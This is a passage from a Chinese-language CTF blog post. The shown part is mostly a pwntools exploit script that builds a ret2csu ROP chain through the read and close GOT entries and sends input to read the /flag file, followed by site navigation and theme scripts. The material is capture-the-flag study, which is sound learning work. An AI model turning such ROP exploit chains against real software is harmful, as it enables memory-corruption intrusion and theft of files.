Craft the ROP chain</span><br>rop_chain = [<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">257</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span> + <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<br>    csu1<br>]<br><br><span class="hljs-comment">#大佬的构造，以下我改成我熟悉的样子(</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ret2csu</span>(<span class="hljs-params">rbx,rbp,r12,r13,r14,r15</span>):<br>    payload = p64(csu2)<br>    payload += p64(rbx)+p64(rbp)<span class="hljs-comment">#一般：rbx = 0 ,rbp = 1</span><br>    payload += p64(r12) <span class="hljs-comment">#call.addr</span><br>    payload += p64(r13) + p64(r14) + p64(r15) <span class="hljs-comment">#三个参数</span><br>    payload += p64(csu1)<br>    payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> payload<br><br>rop_chain =ret2csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) <br>rop_chain +=ret2csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">257</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>rop_chain +=ret2csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>])<br>rop_chain +=ret2csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>rop_chain +=ret2csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span> + <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>rop_chain +=ret2csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>])<br>payload2 = rop_chain<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span>.join([p64(addr) <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> rop_chain])<br><br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendline(offset + payload)<br>p.send(<span class="hljs-string">b&#x27;\x15&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">257</span> - <span class="hljs-number">5</span>))<br>p.send(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/11/11/house-of-botcake/">← 下一篇 house_of_botcake</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/11/03/house-of-lore/">house_of_lore 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/4.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>